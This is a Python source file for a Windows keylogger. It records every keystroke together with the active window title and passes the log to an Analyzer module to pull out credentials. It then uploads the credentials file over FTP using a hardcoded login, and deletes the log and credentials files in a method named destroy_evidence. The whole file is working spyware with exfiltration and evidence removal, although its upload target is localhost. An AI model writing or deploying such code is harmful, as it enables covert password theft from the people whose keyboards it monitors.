from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from os import remove
import logging
import ftplib
import Analyzer

log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
cred_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\totally_not_credentials.txt'

class Logger:
    def __init__(self, log_file, cred_file):
        self.log_file = log_file
        self.cred_file = cred_file
        logging.basicConfig(filename=(log_file), level=logging.DEBUG,
                            format=( '%(message)s : '))
        self.analyzer = Analyzer.Analyzer(log_file, self.cred_file)
    
    def on_press(self, Key):
        log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
        if(str(Key) == 'Key.enter'):
            done_analyzing = False
            logging.info(log_str)
            if(not self.analyzer.will_not_parse):
                done_analyzing = self.analyzer.parse_log_file()
            if done_analyzing:
                return False
        else:
            logging.info(log_str)
    
    def log_keys(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def send_file(self):
        # send file of credentials thru ftp
        session = ftplib.FTP('127.0.0.1', 'Admin', 'Twinbros1;')
        file_to_send = open(self.cred_file, 'rb')
        session.storbinary('STOR ' + 'creds.txt', file_to_send)
        file_to_send.close()
        session.quit()
    
    def destroy_evidence(self):
        logging.shutdown()
        remove(log_file)
        remove(cred_file)
        
if __name__ == '__main__':
    logger = Logger(log_file, cred_file)
    logger.log_keys()
    logger.send_file()
    logger.destroy_evidence()
